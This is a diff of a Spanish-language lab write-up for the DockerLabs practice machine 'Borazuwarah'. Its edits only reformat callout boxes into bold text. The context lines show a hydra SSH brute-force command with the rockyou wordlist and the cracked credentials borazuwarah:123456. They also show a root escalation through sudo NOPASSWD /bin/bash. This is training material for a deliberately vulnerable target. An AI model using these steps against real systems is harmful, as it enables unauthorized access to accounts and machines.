@@ -20,13 +20,13 @@ estado: "✅ Completada"
 
 # 🖥️ Máquina: Borazuwarah
 
-> [!info] Información general
->
-> - **Plataforma:** DockerLabs
-> - **Dificultad:** Muy fácil
-> - **SO:** Debian Linux
-> - **IP objetivo:** `172.17.0.2`
-> - **Técnicas:** Metadatos de imagen · Fuerza bruta SSH · Escalada con sudo NOPASSWD
+## Información general
+
+- **Plataforma:** DockerLabs
+- **Dificultad:** Muy fácil
+- **SO:** Debian Linux
+- **IP objetivo:** `172.17.0.2`
+- **Técnicas:** Metadatos de imagen · Fuerza bruta SSH · Escalada con sudo NOPASSWD
 
 ---
 
@@ -51,7 +51,7 @@ ping 172.17.0.2
 64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.068 ms
 ```
 
-> [!tip] TTL = 64 → Sistema Linux confirmado
+**TTL = 64 → Sistema Linux confirmado**
 
 ---
 
@@ -103,9 +103,9 @@ Description  : ---------- User: borazuwarah ----------
 Title        : ---------- Password:  ----------
 ```
 
-> [!success] Usuario identificado en los metadatos de la imagen: **`borazuwarah`**
+**Usuario identificado en los metadatos de la imagen:** `borazuwarah`
 
-> [!note] El campo `Title` indica que la contraseña está vacía en los metadatos. Esto significa que tendremos que obtenerla por fuerza bruta.
+**Nota:** El campo `Title` indica que la contraseña está vacía en los metadatos. Esto significa que tendremos que obtenerla por fuerza bruta.
 
 ---
 
@@ -123,7 +123,7 @@ hydra -l borazuwarah -P ~/Desktop/Lists/Rockyou/rockyou.txt -v -t 64 ssh://172.1
 [22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
 ```
 
-> [!success] Credenciales válidas: **`borazuwarah:123456`**
+**Credenciales válidas:** `borazuwarah:123456`
 
 ---
 
@@ -154,7 +154,7 @@ User borazuwarah may run the following commands on 6e8dc307494a:
     (ALL) NOPASSWD: /bin/bash
 ```
 
-> [!note] Hay dos entradas relevantes. La primera `(ALL : ALL) ALL` permite ejecutar cualquier comando como root, pero requiere contraseña. La segunda `NOPASSWD: /bin/bash` permite abrir bash como root **sin contraseña**, que es el vector que usaremos.
+**Nota:** Hay dos entradas relevantes. La primera `(ALL : ALL) ALL` permite ejecutar cualquier comando como root, pero requiere contraseña. La segunda `NOPASSWD: /bin/bash` permite abrir bash como root **sin contraseña**, que es el vector que usaremos.
 
 ### Explotación
 
@@ -170,7 +170,7 @@ root@6e8dc307494a:/home/borazuwarah# whoami
 root
 ```
 
-> [!success] Acceso **root** obtenido.
+**Acceso root obtenido.**
 
 ---
 
